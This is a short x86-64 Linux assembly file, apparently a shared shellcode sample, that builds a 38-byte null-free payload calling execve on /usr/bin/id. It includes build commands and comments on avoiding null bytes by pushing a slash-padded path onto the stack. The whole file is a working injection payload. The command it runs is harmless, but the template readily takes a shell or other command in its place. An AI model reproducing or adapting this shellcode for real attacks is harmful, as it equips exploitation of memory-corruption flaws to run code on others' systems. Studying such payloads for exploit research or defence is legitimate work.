// execve("/usr/bin/id") shellcode for linux64
// dan.dsod@gmail.com 
// compile:
// as execve_id.s -o execve_id.o
// ld execve_id.o -o execve_id
// 38 bytes long..


.section .text
.globl _start
_start:
	push   $0x3b
	pop    %rax
	cltd
	push %rdx
	// lets push /usr/bin/id into rbx in 2 parts and
	// avoid nulls.. to do this we use
	// //bin/id = 64692f6e69622f2f 
	// /////usr = 7273752f2f2f2f2f
	movabs $0x64692f6e69622f2f, %rdi
	push %rdi
	movabs $0x7273752f2f2f2f2f, %rdi
	push %rdi
	push %rsp
	pop %rdi
	xor %rsi, %rsi
	push %rsi
	syscall
